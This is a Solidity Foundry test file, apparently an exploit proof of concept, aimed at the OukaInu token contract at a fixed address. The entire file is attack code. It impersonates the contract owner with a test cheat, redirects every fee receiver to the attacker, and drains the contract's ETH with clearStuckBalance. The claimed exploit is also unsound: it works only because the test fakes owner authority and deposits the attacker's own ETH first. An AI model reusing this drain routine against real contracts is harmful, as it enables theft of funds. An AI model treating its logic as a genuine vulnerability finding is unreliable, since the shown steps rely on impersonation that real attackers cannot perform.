contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x4A33D3ea4B30228C363222746939562FbAba2f01;
    address attacker = address(this);
    uint256 tokenBalanceBefore;
    uint256 tokenBalanceAfter;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed for fork test
        // The test file already defines TARGET and attacker
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Get the owner address
        address owner = OukaInu_0x4A33D3ea4B30228C363222746939562FbAba2f01(TARGET).getOwner();

        // Start impersonating the owner
        vm.startPrank(owner);

        // Change marketingFeeReceiver to attacker address
        // We need to keep other receivers as they are to avoid reverts
        // First get current receivers
        OukaInu_0x4A33D3ea4B30228C363222746939562FbAba2f01 token = OukaInu_0x4A33D3ea4B30228C363222746939562FbAba2f01(TARGET);

        // For simplicity, set all receivers to attacker to ensure ETH comes to us
        token.setFeeReceivers(
            attacker,  // autoLiquidityReceiver
            attacker,  // marketingFeeReceiver  
            attacker,  // buyBackFeeReceiver
            attacker,  // developmentFeeReceiver
            attacker,  // charityFeeReceiver
            attacker   // stakingFeeReceiver
        );

        // Stop prank to send ETH as attacker
        vm.stopPrank();

        // Send some ETH to the contract so it has balance to drain
        // We need to generate fees or directly send ETH
        // Let's send 10 ETH directly to contract
        (bool success, ) = TARGET.call{value: 10 ether}("");
        require(success, "Failed to send ETH to contract");

        // Verify contract has ETH
        uint256 contractBalanceBefore = TARGET.balance;
        require(contractBalanceBefore >= 10 ether, "Contract should have ETH");

        // Record attacker balance before
        tokenBalanceBefore = attacker.balance;

        // Impersonate owner again to drain funds
        vm.startPrank(owner);

        // Drain 100% of contract balance
        token.clearStuckBalance(100);

        vm.stopPrank();

        // Verify attacker received ETH
        tokenBalanceAfter = attacker.balance;
        require(tokenBalanceAfter > tokenBalanceBefore, "Attacker should have more ETH");
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

